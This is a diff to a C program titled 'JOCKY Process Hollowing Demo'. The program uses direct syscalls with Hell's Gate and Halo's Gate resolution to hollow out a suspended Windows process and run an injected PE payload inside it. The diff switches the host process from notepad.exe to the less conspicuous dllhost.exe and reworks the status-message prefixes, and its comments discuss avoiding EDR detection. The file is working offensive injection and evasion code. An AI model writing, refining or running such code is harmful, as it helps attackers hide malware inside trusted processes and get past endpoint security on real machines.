@@ -2,6 +2,11 @@
 #include <winternl.h>
 #include <stdio.h>
 #include <stdlib.h>
+//------------------------------------------------------------------------------------
+const char* k = "[+]";
+const char* e = "[-]";
+const char* i = "[*]";
+//------------------------------------------------------------------------------------
 
 // ─────────────────────────────────────────────
 // SSN Resolution (Hell's Gate → Halo's Gate → Fresh Copy)
@@ -196,10 +201,10 @@ void ApplyRelocations(
     ULONGLONG delta
 ) {
     if (delta == 0) {
-        printf("[+] No relocations needed\n");
+        printf("%s No relocations needed\n", i);
         return;
     }
-    printf("[*] Applying relocations, delta: 0x%llX\n", delta);
+    printf("%s Applying relocations, delta: 0x%llX\n", i, delta);
 
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)localPayload;
     PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(localPayload + dos->e_lfanew);
@@ -208,7 +213,7 @@ void ApplyRelocations(
         nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 
     if (relocDir.VirtualAddress == 0) {
-        printf("[*] No relocation table (fixed binary)\n");
+        printf("%s No relocation table (fixed binary)\n", i);
         return;
     }
 
@@ -250,7 +255,7 @@ void ApplyRelocations(
         processed += blockSize;
         reloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)reloc + blockSize);
     }
-    printf("[+] Relocations applied\n");
+    printf("%s Relocations applied\n", k);
 }
 
 // ─────────────────────────────────────────────
@@ -259,7 +264,7 @@ void ApplyRelocations(
 int main() {
     printf("╔══════════════════════════════════════╗\n");
     printf("║   JOCKY Process Hollowing Demo       ║\n");
-    printf("║   Target: notepad.exe                ║\n");
+    printf("║   Target: dllhost.exe                ║\n");
     printf("║   Mode:   Direct Syscalls            ║\n");
     printf("╚══════════════════════════════════════╝\n\n");
 
@@ -278,54 +283,54 @@ int main() {
         (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);
 
     if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
-        printf("[-] Invalid NT signature\n");
+        printf("%s Invalid NT signature\n", e);
         return 1;
     }
 
-    printf("[+] Payload PE verified\n");
-    printf("[+] Preferred base:  0x%llX\n",
+    printf("%s Payload PE verified\n", k);
+    printf("%s Preferred base:  0x%llX\n", k,
            (ULONGLONG)ntHeaders->OptionalHeader.ImageBase);
-    printf("[+] Image size:      0x%X\n",
+    printf("%s Image size:      0x%X\n", k,
            ntHeaders->OptionalHeader.SizeOfImage);
-    printf("[+] Entry point RVA: 0x%X\n\n",
+    printf("%s Entry point RVA: 0x%X\n\n", k,
            ntHeaders->OptionalHeader.AddressOfEntryPoint);
 
-    // ── 1. Launch notepad suspended — WinAPI (not a hot EDR target) ───
-    printf("[*] Launching notepad.exe suspended...\n");
+    // ── 1. Launch dllhost suspended — WinAPI (not a hot EDR target) ───
+    printf("%s Launching dllhost.exe suspended...\n", i);
 
     STARTUPINFOA si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
 
     if (!CreateProcessA(
-        "C:\\Windows\\System32\\notepad.exe",
+        "C:\\Windows\\System32\\dllhost.exe",
         NULL, NULL, NULL, FALSE,
         CREATE_SUSPENDED,
         NULL, NULL, &si, &pi
     )) {
-        printf("[-] CreateProcess failed: %d\n", GetLastError());
+        printf("%s CreateProcess failed: %d\n", e, GetLastError());
         return 1;
     }
 
-    printf("[+] PID: %d | TID: %d\n\n", pi.dwProcessId, pi.dwThreadId);
+    printf("%s PID: %d | TID: %d\n\n", k, pi.dwProcessId, pi.dwThreadId);
 
     // ── 2. Get thread context — DIRECT SYSCALL ─────────────────────────
-    printf("[*] Reading thread context via NtGetContextThread...\n");
+    printf("%s Reading thread context via NtGetContextThread...\n", i);
 
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_FULL;
 
     NTSTATUS status = Syscall_NtGetContextThread(pi.hThread, &ctx);
     if (status != 0) {
-        printf("[-] NtGetContextThread failed: 0x%X\n", status);
+        printf("%s NtGetContextThread failed: 0x%X\n", e, status);
         TerminateProcess(pi.hProcess, 1);
         return 1;
     }
-    printf("[+] Thread context obtained\n");
-    printf("[+] RIP: 0x%llX\n\n", ctx.Rip);
+    printf("%s Thread context obtained\n", k);
+    printf("%s RIP: 0x%llX\n\n", k, ctx.Rip);
 
-    // ── 3. Find PEB and notepad image base — WinAPI (read only, low risk)
-    printf("[*] Locating PEB...\n");
+    // ── 3. Find PEB and dllhost image base — WinAPI (read only, low risk)
+    printf("%s Locating PEB...\n", i);
 
     typedef NTSTATUS(NTAPI* NtQueryProcessInfo_t)(
         HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG
@@ -339,30 +344,30 @@ int main() {
     NtQPI(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLen);
 
     LPVOID pebAddress = pbi.PebBaseAddress;
-    printf("[+] PEB: 0x%p\n", pebAddress);
+    printf("%s PEB: 0x%p\n", k, pebAddress);
 
-    LPVOID notepadImageBase = NULL;
+    LPVOID dllhostImageBase = NULL;
     ReadProcessMemory(
         pi.hProcess,
         (LPBYTE)pebAddress + 0x10,
-        &notepadImageBase,
+        &dllhostImageBase,
         sizeof(LPVOID), NULL
     );
-    printf("[+] Notepad image base: 0x%p\n\n", notepadImageBase);
+    printf("%s Dllhost image base: 0x%p\n\n", k, dllhostImageBase);
 
-    // ── 4. Unmap notepad — DIRECT SYSCALL ─────────────────────────────
-    printf("[*] Unmapping notepad via NtUnmapViewOfSection...\n");
+    // ── 4. Unmap dllhost — DIRECT SYSCALL ─────────────────────────────
+    printf("%s Unmapping dllhost via NtUnmapViewOfSection...\n", i);
 
-    status = Syscall_NtUnmapViewOfSection(pi.hProcess, notepadImageBase);
+    status = Syscall_NtUnmapViewOfSection(pi.hProcess, dllhostImageBase);
     if (status != 0) {
-        printf("[-] NtUnmapViewOfSection failed: 0x%X\n", status);
+        printf("%s NtUnmapViewOfSection failed: 0x%X\n", e, status);
         TerminateProcess(pi.hProcess, 1);
         return 1;
     }
-    printf("[+] Notepad unmapped — process is hollow\n\n");
+    printf("%s Dllhost unmapped — process is hollow\n\n", k);
 
     // ── 5. Allocate memory — DIRECT SYSCALL ───────────────────────────
-    printf("[*] Allocating via NtAllocateVirtualMemory...\n");
+    printf("%s Allocating via NtAllocateVirtualMemory...\n", i);
 
     PVOID allocBase = (PVOID)ntHeaders->OptionalHeader.ImageBase;
     SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
@@ -378,7 +383,7 @@ int main() {
 
     if (status != 0) {
         // Preferred base unavailable — let OS choose
-        printf("[*] Preferred base busy, letting OS assign...\n");
+        printf("%s Preferred base busy, letting OS assign...\n", i);
         allocBase = NULL;
         imageSize = ntHeaders->OptionalHeader.SizeOfImage;
 
@@ -393,14 +398,14 @@ int main() {
     }
 
     if (status != 0) {
-        printf("[-] NtAllocateVirtualMemory failed: 0x%X\n", status);
+        printf("%s NtAllocateVirtualMemory failed: 0x%X\n", e, status);
         TerminateProcess(pi.hProcess, 1);
         return 1;
     }
-    printf("[+] Allocated at: 0x%p\n\n", allocBase);
+    printf("%s Allocated at: 0x%p\n\n", k, allocBase);
 
     // ── 6. Write PE headers — DIRECT SYSCALL ──────────────────────────
-    printf("[*] Writing payload via NtWriteVirtualMemory...\n");
+    printf("%s Writing payload via NtWriteVirtualMemory...\n", i);
 
     SIZE_T bytesWritten = 0;
 
@@ -411,7 +416,7 @@ int main() {
         ntHeaders->OptionalHeader.SizeOfHeaders,
         &bytesWritten
     );
-    printf("[+] PE headers written (%llu bytes)\n", bytesWritten);
+    printf("%s PE headers written (%llu bytes)\n", k, bytesWritten);
 
     // ── 7. Write sections — DIRECT SYSCALL ────────────────────────────
     PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
@@ -429,8 +434,8 @@ int main() {
             &bytesWritten
         );
 
-        printf("[+] Section %-8.8s | RVA: 0x%08X | %llu bytes written\n",
-               section->Name, section->VirtualAddress, bytesWritten);
+        printf("%s Section %-8.8s | RVA: 0x%08X | %llu bytes written\n",
+               k, section->Name, section->VirtualAddress, bytesWritten);
 
         section++;
     }
@@ -447,10 +452,10 @@ int main() {
         &allocBase,
         sizeof(PVOID), NULL
     );
-    printf("[+] PEB ImageBase updated\n");
+    printf("%s PEB ImageBase updated\n", k);
 
     // ── 10. Redirect execution — DIRECT SYSCALL ───────────────────────
-    printf("\n[*] Redirecting RCX to payload entry via NtSetContextThread...\n");
+    printf("\n%s Redirecting RCX to payload entry via NtSetContextThread...\n", i);
 
     ULONGLONG newEntry =
         (ULONGLONG)allocBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
@@ -459,26 +464,26 @@ int main() {
 
     status = Syscall_NtSetContextThread(pi.hThread, &ctx);
     if (status != 0) {
-        printf("[-] NtSetContextThread failed: 0x%X\n", status);
+        printf("%s NtSetContextThread failed: 0x%X\n", e, status);
         TerminateProcess(pi.hProcess, 1);
         return 1;
     }
-    printf("[+] Entry point set: 0x%llX\n", newEntry);
+    printf("%s Entry point set: 0x%llX\n", k, newEntry);
 
     // ── 11. Resume — DIRECT SYSCALL ───────────────────────────────────
-    printf("\n[*] Resuming via NtResumeThread...\n");
+    printf("\n%s Resuming via NtResumeThread...\n", i);
 
     ULONG suspendCount = 0;
     status = Syscall_NtResumeThread(pi.hThread, &suspendCount);
     if (status != 0) {
-        printf("[-] NtResumeThread failed: 0x%X\n", status);
+        printf("%s NtResumeThread failed: 0x%X\n", e, status);
         TerminateProcess(pi.hProcess, 1);
         return 1;
     }
 
     printf("\n╔══════════════════════════════════════════════════╗\n");
     printf("║  HOLLOWING COMPLETE — Direct Syscall Edition     ║\n");
-    printf("║  JOCKY payload running inside notepad.exe        ║\n");
+    printf("║  JOCKY payload running inside dllhost.exe        ║\n");
     printf("║  PID: %-5d                                      ║\n", pi.dwProcessId);
     printf("╚══════════════════════════════════════════════════╝\n");
 
